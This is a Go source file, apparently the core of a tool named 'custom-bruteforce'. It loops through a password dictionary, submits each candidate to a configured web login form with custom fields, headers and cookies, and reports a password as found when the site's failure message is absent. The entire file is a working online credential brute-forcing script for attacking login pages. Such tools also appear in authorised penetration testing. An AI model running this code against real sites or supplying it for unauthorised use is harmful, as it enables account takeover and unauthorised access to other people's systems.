package app

import (
	"custom-bruteforce/pkg/bruteforce"
	"custom-bruteforce/pkg/headers"
	"custom-bruteforce/pkg/site"
	"fmt"
	"io/ioutil"
	"strings"

	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
)

func Run(){
	// Creating a http client
	client := http.Client{}

	// Adding values
	values := url.Values{}
	for _, field := range site.Fields {
		values.Set(field.Name, field.Value)
	}

	// Enabling cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatal(err)
	}
	client.Jar = jar

	// Calculating the length of the dictionary
	total_passwords := len(bruteforce.Dictionary())

	// going through the dictionary
	for index, password := range bruteforce.Dictionary() {
		index = index + 1
		// Adding a password to the values
		values.Set(bruteforce.Field, password)

		// Creating a new http request
		req, err := http.NewRequest(site.Method, site.Host, strings.NewReader(values.Encode()))
		if err != nil {
			log.Fatal(err)
		}
		defer req.Body.Close()

		// Checking if there is any headers created in the file
		if headers.Is() {
			// Going through added headers
			for _, header := range headers.Get() {
				// Adding the headers to the http request
				req.Header.Set(header.Name, header.Value)
			}
		}

		// Sending a http request
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}

		// Checking if the response is 200 OK
		if resp.StatusCode == http.StatusOK {
			// Reading the response body
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatal(err)
			}

			// Checking if in the body is an error message that is specified in the file as an error message
			if !strings.Contains(string(body), bruteforce.Fail.Message) {
				// printing out the message if the password is found
				fmt.Printf("Probably the password was found, password is: %v\n", password)
				return
			}
			fmt.Printf("Testing password %v | progress (%v/%v)\n", password, index, total_passwords)
		} else if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			fmt.Println("Redirect detected")
		}
		
	}
}